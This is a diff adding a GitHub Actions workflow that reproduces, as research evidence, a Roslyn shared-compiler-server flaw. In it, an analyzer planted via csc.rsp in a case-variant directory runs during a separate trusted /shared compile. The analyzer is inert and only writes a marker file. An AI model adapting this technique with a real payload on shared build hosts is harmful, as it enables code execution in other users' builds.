@@ -1,0 +1,199 @@
+name: Roslyn VBCSCompiler case-pipe analyzer execution evidence
+
+on:
+  push:
+    branches:
+      - lab/kestrel-chunk-extensions-20260920
+    paths:
+      - '.github/workflows/roslyn-vbcs-case-pipe-analyzer-exec.yml'
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  linux-analyzer-exec:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: 10.0.401
+
+      - name: Build inert analyzer payload and prove delayed execution through case-colliding server
+        shell: bash
+        run: |
+          set -euxo pipefail
+
+          ROOT="$RUNNER_TEMP/roslyn-vbcs-analyzer-exec"
+          ATTACKER_DIR="$ROOT/trustedcompiler"
+          TRUSTED_DIR="$ROOT/TrustedCompiler"
+          BINDIR="/usr/share/dotnet/sdk/10.0.401/Roslyn/bincore"
+          ANALYZER_SRC="$ROOT/analyzer-src"
+          ANALYZER_OUT="$ANALYZER_SRC/bin/Release/net10.0/MarkerAnalyzer.dll"
+          MARKER="$ROOT/ANALYZER_EXECUTED.marker"
+          LOG="$ROOT/roslyn-client-server.log"
+
+          rm -rf "$ROOT"
+          mkdir -p "$ATTACKER_DIR" "$TRUSTED_DIR" "$ANALYZER_SRC"
+          cp -a "$BINDIR/." "$ATTACKER_DIR/"
+          cp -a "$BINDIR/." "$TRUSTED_DIR/"
+
+          python3 - "$ATTACKER_DIR" "$TRUSTED_DIR" <<'PY'
+          import sys
+          a,b=sys.argv[1:]
+          print("PATHS_DISTINCT=", a != b)
+          print("LOWERCASE_IDENTITIES_EQUAL=", a.lower() == b.lower())
+          assert a != b and a.lower() == b.lower()
+          PY
+
+          cat > "$ANALYZER_SRC/MarkerAnalyzer.csproj" <<EOF
+          <Project Sdk="Microsoft.NET.Sdk">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <Nullable>enable</Nullable>
+              <ImplicitUsings>disable</ImplicitUsings>
+            </PropertyGroup>
+            <ItemGroup>
+              <Reference Include="Microsoft.CodeAnalysis">
+                <HintPath>$BINDIR/Microsoft.CodeAnalysis.dll</HintPath>
+                <Private>false</Private>
+              </Reference>
+              <Reference Include="Microsoft.CodeAnalysis.CSharp">
+                <HintPath>$BINDIR/Microsoft.CodeAnalysis.CSharp.dll</HintPath>
+                <Private>false</Private>
+              </Reference>
+            </ItemGroup>
+          </Project>
+          EOF
+
+          cat > "$ANALYZER_SRC/MarkerAnalyzer.cs" <<EOF
+          using System.Collections.Immutable;
+          using System.IO;
+          using Microsoft.CodeAnalysis;
+          using Microsoft.CodeAnalysis.Diagnostics;
+
+          [DiagnosticAnalyzer(LanguageNames.CSharp)]
+          public sealed class MarkerAnalyzer : DiagnosticAnalyzer
+          {
+              private static readonly DiagnosticDescriptor Rule = new(
+                  "SAFE001",
+                  "Safe research marker",
+                  "Safe research marker",
+                  "Research",
+                  DiagnosticSeverity.Info,
+                  isEnabledByDefault: true);
+
+              public override ImmutableArray<DiagnosticDescriptor> SupportedDiagnostics
+                  => ImmutableArray.Create(Rule);
+
+              public override void Initialize(AnalysisContext context)
+              {
+                  File.WriteAllText(@"$MARKER", "ANALYZER_EXECUTED_DURING_LATER_TRUSTED_COMPILE");
+              }
+          }
+          EOF
+
+          cd "$ROOT"
+          dotnet build "$ANALYZER_SRC/MarkerAnalyzer.csproj"             -c Release             -p:UseSharedCompilation=false             --nologo
+
+          test -f "$ANALYZER_OUT"
+          test ! -e "$MARKER"
+          echo "ANALYZER_BUILD_PRECONDITION=PASS_NO_EXECUTION"
+
+          export RoslynCommandLineLogFile="$LOG"
+
+          cat > "$ROOT/seed.cs" <<'EOF'
+          #error SEED_COMPILATION_ONLY
+          EOF
+
+          echo "=== Start shared server from attacker case-variant directory with config disabled ==="
+          set +e
+          dotnet "$ATTACKER_DIR/csc.dll"             /shared             /noconfig             /nologo             /target:library             "$ROOT/seed.cs"             /out:"$ROOT/seed.dll"             >"$ROOT/seed.stdout" 2>"$ROOT/seed.stderr"
+          SEED_RC=$?
+          set -e
+          cat "$ROOT/seed.stdout"
+          cat "$ROOT/seed.stderr"
+          echo "SEED_RC=$SEED_RC"
+          grep -q "SEED_COMPILATION_ONLY" "$ROOT/seed.stdout" "$ROOT/seed.stderr"
+          test ! -e "$MARKER"
+          echo "SERVER_SEED_PRECONDITION=PASS_ANALYZER_NOT_EXECUTED"
+
+          echo "=== Add attacker-only analyzer response config AFTER server start ==="
+          cat > "$ATTACKER_DIR/csc.rsp" <<EOF
+          /analyzer:$ANALYZER_OUT
+          EOF
+          rm -f "$TRUSTED_DIR/csc.rsp"
+
+          test ! -e "$MARKER"
+          if grep -R -q "MarkerAnalyzer" "$TRUSTED_DIR"; then
+            echo "TRUSTED_DIR_PRECONDITION=FAILED"
+            exit 1
+          fi
+          echo "TRUSTED_DIR_PRECONDITION=PASS_NO_ANALYZER"
+
+          cat > "$ROOT/victim.cs" <<'EOF'
+          public sealed class TrustedVictim
+          {
+          }
+          EOF
+
+          echo "=== Trusted case-distinct client uses /shared ==="
+          rm -f "$MARKER"
+          set +e
+          dotnet "$TRUSTED_DIR/csc.dll"             /shared             /nologo             /target:library             "$ROOT/victim.cs"             /out:"$ROOT/victim.dll"             >"$ROOT/victim.stdout" 2>"$ROOT/victim.stderr"
+          VICTIM_RC=$?
+          set -e
+          cat "$ROOT/victim.stdout"
+          cat "$ROOT/victim.stderr"
+          echo "VICTIM_RC=$VICTIM_RC"
+
+          if test -f "$MARKER"; then
+            cat "$MARKER"
+            echo "ANALYZER_EXEC_RESULT=ATTACKER_ANALYZER_EXECUTED_DURING_TRUSTED_SHARED_COMPILE"
+          else
+            echo "ANALYZER_EXEC_RESULT=NOT_REPRODUCED"
+            exit 1
+          fi
+
+          echo "=== Causal control: same trusted compiler, no /shared ==="
+          rm -f "$MARKER"
+          set +e
+          dotnet "$TRUSTED_DIR/csc.dll"             /nologo             /target:library             "$ROOT/victim.cs"             /out:"$ROOT/control.dll"             >"$ROOT/control.stdout" 2>"$ROOT/control.stderr"
+          CONTROL_RC=$?
+          set -e
+          cat "$ROOT/control.stdout"
+          cat "$ROOT/control.stderr"
+          echo "CONTROL_RC=$CONTROL_RC"
+
+          if test ! -e "$MARKER"; then
+            echo "NO_SHARED_SERVER_CONTROL=PASS_NO_ATTACKER_ANALYZER_EXECUTION"
+          else
+            echo "NO_SHARED_SERVER_CONTROL=FAILED"
+            exit 1
+          fi
+
+          echo "=== Evidence log ==="
+          cat "$LOG" || true
+
+          cp "$ROOT/seed.stdout" "$GITHUB_WORKSPACE/roslyn-analyzer-seed.stdout"
+          cp "$ROOT/seed.stderr" "$GITHUB_WORKSPACE/roslyn-analyzer-seed.stderr"
+          cp "$ROOT/victim.stdout" "$GITHUB_WORKSPACE/roslyn-analyzer-victim.stdout"
+          cp "$ROOT/victim.stderr" "$GITHUB_WORKSPACE/roslyn-analyzer-victim.stderr"
+          cp "$ROOT/control.stdout" "$GITHUB_WORKSPACE/roslyn-analyzer-control.stdout"
+          cp "$ROOT/control.stderr" "$GITHUB_WORKSPACE/roslyn-analyzer-control.stderr"
+          cp "$MARKER" "$GITHUB_WORKSPACE/roslyn-analyzer-marker.txt" 2>/dev/null || true
+          cp "$LOG" "$GITHUB_WORKSPACE/roslyn-analyzer-client-server.log" || true
+
+      - name: Upload evidence
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: roslyn-vbcs-case-pipe-analyzer-exec
+          path: |
+            roslyn-analyzer-*.stdout
+            roslyn-analyzer-*.stderr
+            roslyn-analyzer-*.txt
+            roslyn-analyzer-client-server.log
